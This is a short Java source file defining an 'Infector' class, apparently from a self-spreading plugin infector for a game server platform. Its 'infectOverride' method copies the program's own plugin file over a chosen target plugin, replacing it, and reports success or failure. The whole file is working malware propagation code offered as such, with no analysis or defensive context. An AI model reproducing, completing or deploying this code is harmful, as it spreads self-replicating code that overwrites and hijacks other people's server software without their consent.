package tk.expcode.expcode.infector;

import com.google.common.io.Files;
import tk.expcode.expcode.ExpCode;

import java.io.File;
import java.io.IOException;

public class Infector {

    private final ExpCode main;
    protected File file;
    protected InfectMethode infectMethode;

    public Infector(ExpCode main) {
        this.main = main;
    }

    public Infector setPluginFile(File file) {
        this.file = file;
        return this;
    }

    public Infector setInfectionMethode(InfectMethode infectMethode) {
        this.infectMethode = infectMethode;
        return this;
    }

    public InfectAnswer infect() {
        switch (infectMethode) {
            case OVERRIDE:
                return infectOverride();
            default:
                return infectOverride();
        }
    }

    public InfectAnswer infectOverride() {
        try {
            Files.copy(main.getPluginFile(), file);
        } catch (IOException e) {
            return InfectAnswer.CANNOT_COPY_DIRECTORY;
        }
        return InfectAnswer.SUCCESS;
    }
}
